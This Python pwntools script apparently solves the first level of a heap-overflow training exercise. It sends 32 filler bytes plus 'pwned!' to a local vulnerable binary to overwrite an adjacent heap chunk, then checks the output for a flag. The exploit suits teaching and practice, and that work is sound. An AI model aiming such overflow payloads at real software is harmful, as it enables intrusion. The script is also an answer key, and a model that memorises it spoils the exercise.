#!/usr/bin/env python3
"""
Level 1: Heap Overflow - Solution
目标：通过堆溢出控制chunk2的内容为"pwned!"
"""

from pwn import *

# 配置
context.log_level = 'info'
context.arch = 'amd64'

def solve():
    # 堆布局分析：
    # chunk1: 32字节用户数据 + 元数据
    # chunk2: 32字节用户数据 + 元数据
    # chunk2紧跟在chunk1后面

    # 构造payload：
    # 1. 填充chunk1的32字节
    # 2. 继续写入，覆盖chunk2为"pwned!"

    payload = b"A" * 32 + b"pwned!"

    # 启动进程
    p = process('/root/code/safe/build/level01_overflow/l1_vuln')

    # 发送payload
    p.sendline(payload)

    # 接收输出
    output = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    print(output)

    if 'Congratulations' in output or 'Flag:' in output:
        log.success("Level 1 解题成功！")
        return True
    else:
        log.failure("Level 1 解题失败")
        return False

if __name__ == '__main__':
    solve()
